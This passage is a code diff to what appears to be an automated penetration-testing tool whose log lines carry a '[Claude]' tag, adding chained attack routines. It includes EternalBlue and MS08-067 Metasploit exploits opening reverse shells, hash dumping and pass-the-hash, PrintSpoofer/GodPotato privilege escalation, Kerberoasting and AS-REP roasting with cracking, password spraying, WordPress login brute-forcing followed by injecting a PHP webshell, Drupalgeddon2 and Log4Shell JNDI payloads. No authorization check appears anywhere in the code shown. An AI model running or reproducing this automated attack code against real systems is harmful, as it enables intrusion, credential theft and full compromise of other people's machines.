@@ -6991,6 +6991,7 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                 self._capture_evidence(out, target, f"cred-smb-{user}", f"cmx smb {user}")
                 if "+" in out or "pwn3d" in out.lower():
                     accumulated_output.append(f"=== SMB {user} ===\n{out[:400]}")
+                    self._windows_post_exploit(target, user, pwd, out, accumulated_output)
             # WinRM
             if 5985 in port_set or 5986 in port_set:
                 out, _ = self._run_cmd(
@@ -7484,6 +7485,52 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                 self._capture_evidence(out, target, "ftp-anon-grab", "ftp anonymous")
                 if out.strip():
                     accumulated_output.append(f"=== FTP Anonymous ===\n{out[:600]}")
+
+            # ── EternalBlue MS17-010 + MS08-067 (Windows SMB) ────────────
+            if port_num in (139, 445) and "samba" not in ver:
+                # Check for MS17-010
+                ms17_out, _ = self._run_cmd(
+                    "ms17010-check",
+                    f"nmap -p 445 --script smb-vuln-ms17-010 {target} 2>/dev/null | "
+                    f"grep -iE 'VULNERABLE|MS17-010|EternalBlue|CVE-2017'",
+                    target, timeout=30,
+                )
+                if "VULNERABLE" in ms17_out or "ms17-010" in ms17_out.lower():
+                    self._log(f"[Claude] AUTO-EXPLOIT: MS17-010 EternalBlue detectado!")
+                    eb_out, _ = self._run_cmd(
+                        "eternalblue-exploit",
+                        f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; "
+                        f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
+                        f"set payload windows/x64/shell/reverse_tcp; "
+                        f"set ExitOnSession false; run -j; sleep 20; "
+                        f"sessions -l; sessions -i 1 -c \"whoami && hostname && ipconfig && type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt\"; "
+                        f"exit' 2>/dev/null",
+                        target, timeout=90,
+                    )
+                    self._capture_evidence(eb_out, target, "eternalblue-exploit", "MS17-010 EternalBlue")
+                    accumulated_output.append(f"=== EternalBlue MS17-010 ===\n{eb_out[:800]}")
+                    if any(k in eb_out.lower() for k in ["shell session", "meterpreter session", "nt authority"]):
+                        # Post-exploit Windows via session
+                        self._windows_post_exploit(target, None, None, eb_out, accumulated_output)
+                else:
+                    # Check MS08-067
+                    ms08_out, _ = self._run_cmd(
+                        "ms08067-check",
+                        f"nmap -p 445 --script smb-vuln-ms08-067 {target} 2>/dev/null | "
+                        f"grep -iE 'VULNERABLE|MS08-067|CVE-2008'",
+                        target, timeout=30,
+                    )
+                    if "VULNERABLE" in ms08_out:
+                        self._log(f"[Claude] AUTO-EXPLOIT: MS08-067!")
+                        out, _ = self._run_cmd(
+                            "ms08067-exploit",
+                            f"msfconsole -q -x 'use exploit/windows/smb/ms08_067_netapi; "
+                            f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
+                            f"set payload windows/shell/reverse_tcp; run; sleep 15; exit' 2>/dev/null",
+                            target, timeout=90,
+                        )
+                        self._capture_evidence(out, target, "ms08067-exploit", "MS08-067")
+                        accumulated_output.append(f"=== MS08-067 ===\n{out[:600]}")
 
             # ── MSSQL SA sin contraseña → xp_cmdshell RCE ────────────────
             if port_num == 1433 or "ms-sql" in svc or "mssql" in svc:
@@ -8200,6 +8247,579 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                 "cve": "",
             }], target)
 
+    # ─────────────────────────────────────────────────────────────────────────
+    # Windows post-exploitation chain (secretsdump, pass-the-hash, potato)
+    # ─────────────────────────────────────────────────────────────────────────
+    def _windows_post_exploit(self, target, user, pwd, shell_output, accumulated_output):
+        """Full Windows post-exploitation: dump hashes, pass-the-hash, privilege escalation."""
+        self._log(f"[Claude] WIN-POST-EXPLOIT: {target} ({user or 'session'})")
+        auth_args = f"-u '{user}' -p '{pwd}'" if user and pwd else ""
+        t_safe = target.replace(".", "_")
+
+        # ── 1. secretsdump — extract all hashes ───────────────────────────
+        self._log(f"[Claude] WIN-POST-EXPLOIT: secretsdump → volcando hashes")
+        dump_cmd = (
+            f"impacket-secretsdump {auth_args} {target} 2>/dev/null | head -60"
+            if auth_args else
+            f"impacket-secretsdump -no-pass {target} 2>/dev/null | head -60"
+        )
+        dump_out, _ = self._run_cmd("win-secretsdump", dump_cmd, target, timeout=60)
+        if dump_out.strip():
+            accumulated_output.append(f"=== secretsdump {target} ===\n{dump_out[:1200]}")
+            self._auto_crack_hashes(dump_out, target, accumulated_output)
+            # Extract NTLM hashes for pass-the-hash
+            ntlm_hashes = re.findall(r'(\w+):[^:]+:([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::', dump_out)
+            for uname, lm, nt in ntlm_hashes[:5]:
+                self._log(f"[Claude] WIN-POST-EXPLOIT: PTH → {uname}:{nt[:16]}...")
+                pth_out, _ = self._run_cmd(
+                    f"win-pth-{uname}",
+                    f"crackmapexec smb {target} -u '{uname}' -H '{nt}' --shares 2>/dev/null | head -10; "
+                    f"impacket-psexec -hashes ':{nt}' {uname}@{target} 'whoami && ipconfig && type C:\\Users\\Administrator\\Desktop\\root.txt 2>nul' 2>/dev/null | head -15",
+                    target, timeout=40,
+                )
+                self._capture_evidence(pth_out, target, f"win-pth-{uname}", f"pass-the-hash {uname}")
+                if any(k in pth_out.lower() for k in ["nt authority", "administrator", "pwn3d"]):
+                    accumulated_output.append(f"=== Pass-The-Hash {uname} ===\n{pth_out[:600]}")
+                    self._save_findings([{
+                        "title": f"Pass-The-Hash Exitoso: {uname} @ {target}",
+                        "severity": "critical",
+                        "description": f"Hash NTLM de {uname} válido para autenticación PTH:\n{pth_out[:300]}",
+                        "cve": "",
+                    }], target)
+
+        # ── 2. Check SeImpersonatePrivilege → PrintSpoofer/GodPotato ────
+        self._log(f"[Claude] WIN-POST-EXPLOIT: verificando SeImpersonatePrivilege")
+        if user and pwd:
+            priv_out, _ = self._run_cmd(
+                "win-whoami-priv",
+                f"crackmapexec smb {target} -u '{user}' -p '{pwd}' -x 'whoami /priv' 2>/dev/null | head -20",
+                target, timeout=20,
+            )
+            if "SeImpersonatePrivilege" in priv_out or "SeAssignPrimaryTokenPrivilege" in priv_out:
+                self._log(f"[Claude] WIN-POST-EXPLOIT: SeImpersonatePrivilege → PrintSpoofer!")
+                potato_out, _ = self._run_cmd(
+                    "win-printspoofer",
+                    f"crackmapexec smb {target} -u '{user}' -p '{pwd}' "
+                    f"--put-file /tmp/PrintSpoofer64.exe C:\\Windows\\Temp\\ps.exe 2>/dev/null; "
+                    f"crackmapexec smb {target} -u '{user}' -p '{pwd}' "
+                    f"-x 'C:\\Windows\\Temp\\ps.exe -i -c \"whoami && type C:\\Users\\Administrator\\Desktop\\root.txt\"' 2>/dev/null | head -10; "
+                    f"# Alternative: GodPotato\n"
+                    f"crackmapexec smb {target} -u '{user}' -p '{pwd}' "
+                    f"--put-file /tmp/GodPotato.exe C:\\Windows\\Temp\\gp.exe 2>/dev/null; "
+                    f"crackmapexec smb {target} -u '{user}' -p '{pwd}' "
+                    f"-x 'C:\\Windows\\Temp\\gp.exe -cmd \"whoami\"' 2>/dev/null | head -5",
+                    target, timeout=60,
+                )
+                self._capture_evidence(potato_out, target, "win-printspoofer", "PrintSpoofer/GodPotato")
+                accumulated_output.append(f"=== PrintSpoofer/GodPotato ===\n{potato_out[:600]}")
+                self._save_findings([{
+                    "title": f"Windows PrivEsc: SeImpersonatePrivilege → SYSTEM @ {target}",
+                    "severity": "critical",
+                    "description": f"SeImpersonatePrivilege disponible → PrintSpoofer/GodPotato → NT AUTHORITY\\SYSTEM.\n{potato_out[:300]}",
+                    "cve": "",
+                }], target)
+
+        # ── 3. SAM + NTDS backup dump (SeBackupPrivilege) ─────────────────
+        if user and pwd:
+            backup_out, _ = self._run_cmd(
+                "win-sam-dump",
+                f"crackmapexec smb {target} -u '{user}' -p '{pwd}' "
+                f"-x 'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv & "
+                f"reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv' 2>/dev/null | head -5; "
+                f"impacket-smbclient {auth_args} //{target}/C$ 2>/dev/null -c "
+                f"'get Windows\\Temp\\sam.hiv /tmp/sam_{t_safe}.hiv; "
+                f"get Windows\\Temp\\sys.hiv /tmp/sys_{t_safe}.hiv' 2>/dev/null; "
+                f"impacket-secretsdump -sam /tmp/sam_{t_safe}.hiv -system /tmp/sys_{t_safe}.hiv LOCAL 2>/dev/null | head -20",
+                target, timeout=60,
+            )
+            if ":" in backup_out and "aad3b435" in backup_out.lower():
+                self._auto_crack_hashes(backup_out, target, accumulated_output)
+                accumulated_output.append(f"=== SAM Dump ===\n{backup_out[:600]}")
+
+        # ── 4. AD recon (if domain controller) ───────────────────────────
+        dc_indicators = ["domain controller", "active directory", "ldap", "kerberos", "win-dc"]
+        if any(ind in (shell_output or "").lower() for ind in dc_indicators) or 88 in {
+            p["port"] for p in ([] if not hasattr(self, "_last_open_ports") else self._last_open_ports)
+        }:
+            self._ad_attacks(target, user, pwd, accumulated_output)
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Active Directory attacks (Kerberoasting, AS-REP, BloodHound)
+    # ─────────────────────────────────────────────────────────────────────────
+    def _ad_attacks(self, target, user, pwd, accumulated_output):
+        """Kerberoasting, AS-REP Roasting, and basic AD enumeration."""
+        self._log(f"[Claude] AD-ATTACKS: Kerberoasting + AS-REP @ {target}")
+        auth = f"-u '{user}' -p '{pwd}'" if user and pwd else ""
+        t_safe = target.replace(".", "_")
+
+        # ── Enumerate domain + DC ─────────────────────────────────────────
+        enum_out, _ = self._run_cmd(
+            "ad-enum",
+            f"crackmapexec smb {target} {auth} --users 2>/dev/null | head -30; "
+            f"crackmapexec smb {target} {auth} --groups 2>/dev/null | head -20; "
+            f"crackmapexec ldap {target} {auth} --users 2>/dev/null | head -20",
+            target, timeout=40,
+        )
+        if enum_out.strip():
+            accumulated_output.append(f"=== AD Enumeration ===\n{enum_out[:800]}")
+            # Extract domain name
+            domain_match = re.search(r'domain:([^\s]+)', enum_out, re.IGNORECASE)
+            domain = domain_match.group(1) if domain_match else ""
+
+        # ── Kerberoasting — get service tickets for offline cracking ─────
+        self._log(f"[Claude] AD-ATTACKS: Kerberoasting")
+        kerb_out, _ = self._run_cmd(
+            "kerberoasting",
+            f"impacket-GetUserSPNs {auth} -dc-ip {target} "
+            f"{'domain/' if not auth else ''}{target} -request 2>/dev/null | head -40; "
+            f"# Also try with crackmapexec\n"
+            f"crackmapexec ldap {target} {auth} --kerberoasting /tmp/kerb_{t_safe}.txt 2>/dev/null | head -10; "
+            f"cat /tmp/kerb_{t_safe}.txt 2>/dev/null | head -20",
+            target, timeout=40,
+        )
+        if "$krb5tgs$" in kerb_out:
+            self._log(f"[Claude] AD-ATTACKS: tickets Kerberoast encontrados → crackeando!")
+            # Save tickets to file
+            with open(f"/tmp/kerb_hashes_{t_safe}.txt", "w") as f:
+                for m in re.findall(r'\$krb5tgs\$\d+\$[^\s]+', kerb_out):
+                    f.write(m + "\n")
+            crack_out, _ = self._run_cmd(
+                "kerb-crack",
+                f"hashcat -a 0 -m 13100 --force --quiet "
+                f"/tmp/kerb_hashes_{t_safe}.txt "
+                f"/usr/share/wordlists/rockyou.txt "
+                f"-r /usr/share/hashcat/rules/best64.rule 2>/dev/null | tail -10; "
+                f"hashcat -m 13100 --show /tmp/kerb_hashes_{t_safe}.txt 2>/dev/null | head -10",
+                target, timeout=300,
+            )
+            accumulated_output.append(f"=== Kerberoasting ===\n{kerb_out[:400]}\nCracked:\n{crack_out[:400]}")
+            self._save_findings([{
+                "title": f"AD: Kerberoasting → Tickets Crackeados @ {target}",
+                "severity": "high",
+                "description": f"Tickets Kerberos crackeados con rockyou:\n{crack_out[:300]}",
+                "cve": "",
+            }], target)
+
+        # ── AS-REP Roasting — accounts with no pre-auth ───────────────────
+        self._log(f"[Claude] AD-ATTACKS: AS-REP Roasting")
+        asrep_out, _ = self._run_cmd(
+            "asrep-roasting",
+            f"impacket-GetNPUsers -dc-ip {target} -no-pass -usersfile /tmp/kerb_users_{t_safe}.txt "
+            f"{target}/ 2>/dev/null | head -20; "
+            f"crackmapexec ldap {target} {auth} --asreproast /tmp/asrep_{t_safe}.txt 2>/dev/null | head -10; "
+            f"cat /tmp/asrep_{t_safe}.txt 2>/dev/null | head -10",
+            target, timeout=40,
+        )
+        if "$krb5asrep$" in asrep_out:
+            with open(f"/tmp/asrep_hashes_{t_safe}.txt", "w") as f:
+                for m in re.findall(r'\$krb5asrep\$[^\s]+', asrep_out):
+                    f.write(m + "\n")
+            crack_out, _ = self._run_cmd(
+                "asrep-crack",
+                f"hashcat -a 0 -m 18200 --force --quiet "
+                f"/tmp/asrep_hashes_{t_safe}.txt "
+                f"/usr/share/wordlists/rockyou.txt 2>/dev/null | tail -10; "
+                f"hashcat -m 18200 --show /tmp/asrep_hashes_{t_safe}.txt 2>/dev/null | head -10",
+                target, timeout=300,
+            )
+            accumulated_output.append(f"=== AS-REP Roasting ===\n{asrep_out[:400]}\nCracked:\n{crack_out[:400]}")
+            self._save_findings([{
+                "title": f"AD: AS-REP Roasting → Contraseñas Obtenidas @ {target}",
+                "severity": "critical",
+                "description": f"Cuentas sin pre-autenticación Kerberos:\n{crack_out[:300]}",
+                "cve": "",
+            }], target)
+
+        # ── Password spray ────────────────────────────────────────────────
+        users_found = re.findall(r'(?:User:|username:)\s*(\w+)', enum_out, re.IGNORECASE)
+        if users_found:
+            self._log(f"[Claude] AD-ATTACKS: password spray {len(users_found)} usuarios")
+            for spray_pass in ["Password1", "Welcome1", "Summer2024!", "Winter2024!", "P@ssword1"]:
+                spray_out, _ = self._run_cmd(
+                    f"ad-spray-{spray_pass[:6]}",
+                    f"crackmapexec smb {target} -u {','.join(users_found[:15])} -p '{spray_pass}' "
+                    f"--continue-on-success 2>/dev/null | grep '\\[+\\]' | head -5",
+                    target, timeout=30,
+                )
+                if "[+]" in spray_out:
+                    self._log(f"[Claude] AD-ATTACKS: spray exitoso con {spray_pass}!")
+                    accumulated_output.append(f"=== AD Password Spray ===\n{spray_out[:400]}")
+                    # Extract valid creds and pivot
+                    valid = re.findall(r'\[\+\]\s+\S+\\(\w+):(\S+)', spray_out)
+                    if valid:
+                        self._windows_post_exploit(target, valid[0][0], valid[0][1], spray_out, accumulated_output)
+                    break
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # CMS exploitation (WordPress, Joomla, Drupal)
+    # ─────────────────────────────────────────────────────────────────────────
+    def _cms_exploit(self, target, open_ports, accumulated_output):
+        """Auto-detect and exploit WordPress, Joomla, Drupal."""
+        http_ports = [p["port"] for p in open_ports if "http" in p["service"].lower()
+                      or p["port"] in (80, 443, 8080, 8443, 8888)]
+        if not http_ports:
+            return
+
+        for port_num in http_ports[:3]:
+            proto = "https" if port_num in (443, 8443) else "http"
+            base = f"{proto}://{target}:{port_num}"
+
+            # ── CMS detection ─────────────────────────────────────────────
+            detect_out, _ = self._run_cmd(
+                f"cms-detect-{port_num}",
+                f"curl -s --max-time 10 -L '{base}/' 2>/dev/null | "
+                f"grep -iEo 'wp-content|wp-includes|/joomla|com_content|/sites/default/files|drupal' | head -3; "
+                f"curl -s --max-time 8 -I '{base}/wp-login.php' 2>/dev/null | grep '200\\|301'; "
+                f"curl -s --max-time 8 -I '{base}/administrator/index.php' 2>/dev/null | grep '200\\|301'; "
+                f"curl -s --max-time 8 -I '{base}/user/login' 2>/dev/null | grep '200\\|301'",
+                target, timeout=20,
+            )
+
+            # ── WordPress ─────────────────────────────────────────────────
+            if "wp-content" in detect_out.lower() or "wp-includes" in detect_out.lower():
+                self._log(f"[Claude] CMS: WordPress detectado en {base}")
+                # Enumerate users + brute force + plugin vulns
+                wp_out, _ = self._run_cmd(
+                    f"wpscan-{port_num}",
+                    f"wpscan --url '{base}' --no-update --disable-tls-checks "
+                    f"--enumerate u,vp,vt --plugins-detection aggressive "
+                    f"--max-threads 5 2>/dev/null | head -80; "
+                    f"# Extract users and try default/common passwords\n"
+                    f"WP_USERS=$(wpscan --url '{base}' --no-update --enumerate u "
+                    f"--format json 2>/dev/null | python3 -c "
+                    f"\"import json,sys; d=json.load(sys.stdin); "
+                    f"[print(u) for u in d.get('users',{{}}).keys()]\" 2>/dev/null | head -5); "
+                    f"for u in $WP_USERS admin administrator; do "
+                    f"  for p in admin password 123456 wordpress admin123 letmein; do "
+                    f"    R=$(curl -s --max-time 8 -c /tmp/wp_cookie_{target.replace('.','_')}.txt "
+                    f"    -X POST '{base}/wp-login.php' "
+                    f"    -d \"log=$u&pwd=$p&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1\" "
+                    f"    -b 'wordpress_test_cookie=WP+Cookie+check' 2>/dev/null | head -3); "
+                    f"    echo \"$R\" | grep -qv 'login_error\\|Error' && echo \"WP_LOGIN_OK: $u:$p\" && break 2; "
+                    f"  done; "
+                    f"done",
+                    target, timeout=120,
+                )
+                accumulated_output.append(f"=== WordPress {base} ===\n{wp_out[:1200]}")
+                # Parse valid WP creds
+                wp_creds = re.findall(r'WP_LOGIN_OK: (\w+):(\S+)', wp_out)
+                for wp_u, wp_p in wp_creds[:2]:
+                    self._log(f"[Claude] CMS: WordPress creds válidas {wp_u}:{wp_p} → intentando RCE!")
+                    # Theme editor RCE (404.php)
+                    rce_out, _ = self._run_cmd(
+                        f"wp-rce-{wp_u}",
+                        f"# Login and inject webshell via theme editor\n"
+                        f"WP_NONCE=$(curl -s --max-time 10 "
+                        f"-b /tmp/wp_cookie_{target.replace('.','_')}.txt "
+                        f"'{base}/wp-admin/theme-editor.php?file=404.php&theme=twentytwentyone' 2>/dev/null | "
+                        f"grep -oP 'nonce\":\"[^\"]+' | head -1 | cut -d'\"' -f3); "
+                        f"curl -s --max-time 15 -X POST "
+                        f"-b /tmp/wp_cookie_{target.replace('.','_')}.txt "
+                        f"'{base}/wp-admin/theme-editor.php' "
+                        f"-d \"nonce=$WP_NONCE&newcontent=<?php+system(\\$_GET['cmd']);+?>&action=edit-theme-plugin-file"
+                        f"&file=404.php&theme=twentytwentyone&scrollTop=0\" 2>/dev/null | head -3; "
+                        f"curl -s --max-time 10 '{base}/wp-content/themes/twentytwentyone/404.php?cmd=id' "
+                        f"2>/dev/null | grep 'uid=' | head -2",
+                        target, timeout=30,
+                    )
+                    self._capture_evidence(rce_out, target, f"wp-rce-{wp_u}", f"WP theme RCE {wp_u}")
+                    if "uid=" in rce_out:
+                        accumulated_output.append(f"=== WordPress RCE ({wp_u}) ===\n{rce_out[:400]}")
+                        self._save_findings([{
+                            "title": f"WordPress RCE via Theme Editor @ {base}",
+                            "severity": "critical",
+                            "description": f"Creds: {wp_u}:{wp_p} → webshell en 404.php → RCE.\n{rce_out[:200]}",
+                            "cve": "",
+                        }], target)
+                # Save WP vulnerabilities as findings
+                vuln_plugins = re.findall(r'\[!\]\s+(.+?CVE-\d{4}-\d+.+)', wp_out)
+                for vuln in vuln_plugins[:5]:
+                    self._save_findings([{
+                        "title": f"WordPress Plugin Vuln @ {base}",
+                        "severity": "high",
+                        "description": vuln[:200],
+                        "cve": re.search(r'CVE-\d{4}-\d+', vuln).group(0) if re.search(r'CVE-\d{4}-\d+', vuln) else "",
+                    }], target)
+
+            # ── Joomla ────────────────────────────────────────────────────
+            elif "joomla" in detect_out.lower() or "com_content" in detect_out.lower():
+                self._log(f"[Claude] CMS: Joomla detectado en {base}")
+                joomla_out, _ = self._run_cmd(
+                    f"joomla-scan-{port_num}",
+                    f"droopescan scan joomla -u '{base}' 2>/dev/null | head -40; "
+                    f"# Try default admin creds\n"
+                    f"for u in admin administrator superuser; do "
+                    f"  for p in admin password 123456 joomla admin123; do "
+                    f"    TOKEN=$(curl -s --max-time 8 '{base}/administrator/index.php' 2>/dev/null | "
+                    f"    grep -oP 'name=\"[a-f0-9]{{32}}\"' | head -1 | grep -oP '[a-f0-9]{{32}}'); "
+                    f"    R=$(curl -s --max-time 10 "
+                    f"    -X POST '{base}/administrator/index.php' "
+                    f"    -d \"username=$u&passwd=$p&option=com_login&task=login&return=aW5kZXgucGhw&$TOKEN=1\" "
+                    f"    2>/dev/null | grep -v 'Invalid\\|error' | head -3); "
+                    f"    echo \"$R\" | grep -q 'cpanel\\|index.php?option=com_cpanel' && echo \"JOOMLA_OK: $u:$p\" && break 2; "
+                    f"  done; "
+                    f"done",
+                    target, timeout=60,
+                )
+                accumulated_output.append(f"=== Joomla {base} ===\n{joomla_out[:800]}")
+
+            # ── Drupal ────────────────────────────────────────────────────
+            elif "drupal" in detect_out.lower() or "sites/default" in detect_out.lower():
+                self._log(f"[Claude] CMS: Drupal detectado en {base}")
+                drupal_out, _ = self._run_cmd(
+                    f"drupal-scan-{port_num}",
+                    f"droopescan scan drupal -u '{base}' 2>/dev/null | head -40; "
+                    f"# Drupalgeddon2 CVE-2018-7600\n"
+                    f"python3 -c \""
+                    f"import urllib.request,urllib.parse\n"
+                    f"url='{base}/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup'\n"
+                    f"try:\n"
+                    f"  r=urllib.request.urlopen(urllib.request.Request(url,b'form_id=user_pass&_triggering_element_name=name',method='POST'),timeout=10)\n"
+                    f"  print(r.read(200))\n"
+                    f"except Exception as e: print(e)\n"
+                    f"\" 2>/dev/null | grep -E 'uid=|root|www-data'; "
+                    f"# Drupalgeddon3 CVE-2018-7602\n"
+                    f"msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2; "
+                    f"set RHOSTS {target}; set RPORT {port_num}; "
+                    f"set LHOST {self.lhost}; set LPORT {self.lport}; "
+                    f"set PAYLOAD php/meterpreter/reverse_tcp; run; sleep 12; exit' 2>/dev/null | head -20",
+                    target, timeout=60,
+                )
+                self._capture_evidence(drupal_out, target, f"drupal-exploit-{port_num}", "Drupalgeddon2/3")
+                accumulated_output.append(f"=== Drupal {base} ===\n{drupal_out[:800]}")
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Web content fuzzing (feroxbuster / gobuster)
+    # ─────────────────────────────────────────────────────────────────────────
+    def _web_fuzz(self, target, open_ports, accumulated_output):
+        """Fuzz web endpoints for hidden paths, backups, admin panels."""
+        http_ports = [p["port"] for p in open_ports if "http" in p["service"].lower()
+                      or p["port"] in (80, 443, 8080, 8443, 8888)]
+        if not http_ports:
+            return
+
+        # Prefer feroxbuster, fall back to gobuster or dirb
+        fuzz_tool = None
+        for tool in ["feroxbuster", "gobuster", "dirb"]:
+            check, _ = self._run_cmd(f"check-{tool}", f"which {tool} 2>/dev/null", target, timeout=5)
+            if check.strip():
+                fuzz_tool = tool
+                break
+
+        if not fuzz_tool:
+            self._log(f"[Claude] WEB-FUZZ: ningún fuzzer disponible (feroxbuster/gobuster/dirb)")
+            return
+
+        wordlist_paths = [
+            "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
+            "/usr/share/wordlists/dirb/common.txt",
+            "/usr/share/seclists/Discovery/Web-Content/common.txt",
+            "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
+        ]
+        wordlist = next((p for p in wordlist_paths if __import__('os').path.exists(p)), None)
+        if not wordlist:
+            self._log(f"[Claude] WEB-FUZZ: wordlist no encontrada")
+            return
+
+        for port_num in http_ports[:2]:
+            proto = "https" if port_num in (443, 8443) else "http"
+            base = f"{proto}://{target}:{port_num}"
+            self._log(f"[Claude] WEB-FUZZ: {fuzz_tool} → {base}")
+
+            if fuzz_tool == "feroxbuster":
+                cmd = (
+                    f"feroxbuster -u '{base}' -w {wordlist} -t 30 -d 2 "
+                    f"--no-recursion --quiet --status-codes 200,301,302,403 "
+                    f"--timeout 8 --output /tmp/ferox_{target.replace('.','_')}_{port_num}.txt "
+                    f"2>/dev/null | grep -E '^[23][0-9]{{2}}' | head -40"
+                )
+            elif fuzz_tool == "gobuster":
+                cmd = (
+                    f"gobuster dir -u '{base}' -w {wordlist} -t 30 "
+                    f"--no-tls-validation -q --timeout 8s "
+                    f"-o /tmp/gobuster_{target.replace('.','_')}_{port_num}.txt "
+                    f"2>/dev/null | head -40"
+                )
+            else:  # dirb
+                cmd = (
+                    f"dirb '{base}' {wordlist} -S -r -o "
+                    f"/tmp/dirb_{target.replace('.','_')}_{port_num}.txt "
+                    f"2>/dev/null | grep -E 'CODE:2|CODE:3' | head -40"
+                )
+
+            fuzz_out, _ = self._run_cmd(f"webfuzz-{port_num}", cmd, target, timeout=180)
+            if fuzz_out.strip():
+                accumulated_output.append(f"=== Web Fuzz {base} ===\n{fuzz_out[:1200]}")
+                # Highlight interesting findings
+                interesting = re.findall(
+                    r'(?:200|301)\s+(https?://[^\s]+(?:admin|backup|upload|api|config|debug|test|shell|'
+                    r'phpmyadmin|manager|console|dashboard|panel|login)[^\s]*)',
+                    fuzz_out, re.IGNORECASE
+                )
+                for path in interesting[:5]:
+                    self._save_findings([{
+                        "title": f"Directorio/Archivo Interesante: {path.split('/')[-1]} @ {base}",
+                        "severity": "medium",
+                        "description": f"Ruta descubierta por fuzzing: {path}",
+                        "cve": "",
+                    }], target)
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Log4Shell CVE-2021-44228 scanner
+    # ─────────────────────────────────────────────────────────────────────────
+    def _log4shell_scan(self, target, open_ports, accumulated_output):
+        """Test for Log4Shell CVE-2021-44228 via JNDI injection in HTTP headers."""
+        http_ports = [p["port"] for p in open_ports if "http" in p["service"].lower()
+                      or p["port"] in (80, 443, 8080, 8443, 8888, 9200)]
+        # Also check Java-specific ports
+        java_ports = [p["port"] for p in open_ports if any(j in p["service"].lower() + p["version"].lower()
+                      for j in ["java", "tomcat", "jboss", "wildfly", "spring", "jetty", "log4j"])]
+        target_ports = list(dict.fromkeys(http_ports + java_ports))[:4]
+        if not target_ports:
+            return
+
+        self._log(f"[Claude] LOG4SHELL: probando CVE-2021-44228 en {len(target_ports)} puertos")
+
+        # Start a quick HTTP listener to catch callbacks
+        cb_port = self.lport + 10
+        cb_out, _ = self._run_cmd(
+            "log4shell-listener",
+            f"timeout 30 nc -lvnp {cb_port} 2>/dev/null &"
+            f"echo CB_LISTENER_PID=$!",
+            target, timeout=5,
+        )
+
+        for port_num in target_ports:
+            proto = "https" if port_num in (443, 8443) else "http"
+            base = f"{proto}://{target}:{port_num}"
+            # Discover endpoints first
+            endpoints, _ = self._run_cmd(
+                f"log4shell-endpoints-{port_num}",
+                f"curl -s --max-time 8 -o /dev/null -w '%{{url_effective}}' -L '{base}/' 2>/dev/null; "
+                f"echo; "
+                f"curl -s --max-time 8 '{base}/' 2>/dev/null | grep -oP 'action=\"[^\"]+\"' | head -5 | "
+                f"cut -d'\"' -f2 | head -3",
+                target, timeout=12,
+            )
+            test_urls = [base + "/"] + [base + e if e.startswith("/") else e
+                                         for e in re.findall(r'https?://\S+|/\S+', endpoints)][:3]
+            # JNDI payload targeting our callback server
+            payload = f"${{jndi:ldap://{self.lhost}:{cb_port}/log4shell}}"
+            payload_dns = f"${{jndi:dns://{self.lhost}:{cb_port}/log4shell}}"
+
+            for test_url in test_urls[:3]:
+                l4_out, _ = self._run_cmd(
+                    f"log4shell-{port_num}-{hash(test_url) % 9999}",
+                    f"curl -s --max-time 10 '{test_url}' "
+                    f"-H 'User-Agent: {payload}' "
+                    f"-H 'X-Forwarded-For: {payload}' "
+                    f"-H 'X-Api-Version: {payload}' "
+                    f"-H 'Referer: {payload}' "
+                    f"-H 'X-Forwarded-Host: {payload}' "
+                    f"2>/dev/null | head -3; "
+                    # Also POST to login forms
+                    f"curl -s --max-time 10 '{test_url}' "
+                    f"-X POST "
+                    f"-d 'username={payload}&password=log4shell' "
+                    f"-H 'Content-Type: application/x-www-form-urlencoded' "
+                    f"2>/dev/null | head -3",
+                    target, timeout=15,
+                )
+                # Check if our callback listener received a connection
+                cb_check, _ = self._run_cmd(
+                    f"log4shell-cb-check-{port_num}",
+                    f"ls -la /proc/$(cat /tmp/log4shell_cb_pid 2>/dev/null)/fd 2>/dev/null | "
+                    f"grep 'socket' | wc -l; "
+                    f"# Direct check via ss\n"
+                    f"ss -tnp 2>/dev/null | grep ':{cb_port}' | grep -v LISTEN | head -3",
+                    target, timeout=5,
+                )
+                if cb_check.strip() and any(c.isdigit() and int(c) > 0 for c in cb_check.split()):
+                    self._log(f"[Claude] LOG4SHELL: CALLBACK RECIBIDO de {target}:{port_num}!")
+                    self._save_findings([{
+                        "title": f"Log4Shell CVE-2021-44228 CONFIRMADO @ {target}:{port_num}",
+                        "severity": "critical",
+                        "description": f"JNDI callback recibido → Log4j vulnerable.\nURL: {test_url}\n"
+                                       f"Payload inyectado en headers HTTP.",
+                        "cve": "CVE-2021-44228",
+                    }], target)
+                    accumulated_output.append(f"=== LOG4SHELL CONFIRMED {base} ===\ncallback recibido")
+                    break
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # SQLmap automatic exploitation
+    # ─────────────────────────────────────────────────────────────────────────
+    def _sqlmap_auto(self, target, open_ports, accumulated_output):
+        """Auto-run sqlmap on discovered HTTP endpoints and forms."""
+        http_ports = [p["port"] for p in open_ports if "http" in p["service"].lower()
+                      or p["port"] in (80, 443, 8080, 8443, 8888)]
+        if not http_ports:
+            return
+
+        sqlmap_available, _ = self._run_cmd("check-sqlmap", "which sqlmap 2>/dev/null", target, timeout=5)
+        if not sqlmap_available.strip():
+            return
+
+        self._log(f"[Claude] SQLMAP: escaneando endpoints HTTP en {len(http_ports)} puertos")
+        t_safe = target.replace(".", "_")
+
+        for port_num in http_ports[:2]:
+            proto = "https" if port_num in (443, 8443) else "http"
+            base = f"{proto}://{target}:{port_num}"
+
+            # ── Crawl for forms and URL params ────────────────────────────
+            crawl_out, _ = self._run_cmd(
+                f"sqlmap-crawl-{port_num}",
